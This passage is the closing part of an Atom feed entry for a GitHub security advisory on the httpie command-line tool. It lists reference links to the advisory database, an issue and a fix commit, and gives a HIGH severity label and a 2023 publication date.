<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/httpie/PYSEC-2023-242.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/httpie/PYSEC-2023-242.yaml</a></li>
<li><a href="https://github.com/httpie/cli/issues/1549">https://github.com/httpie/cli/issues/1549</a></li>
<li><a href="https://github.com/httpie/cli/commit/7f03c52d2237440c5a672296ce6955aae4ed4f09">https://github.com/httpie/cli/commit/7f03c52d2237440c5a672296ce6955aae4ed4f09</a></li>
<li><a href="https://github.com/advisories/GHSA-8r96-8889-qg2x">https://github.com/advisories/GHSA-8r96-8889-qg2x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r96-8889-qg2x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-16T18:30:31.000Z</published>
    </entry>
</feed>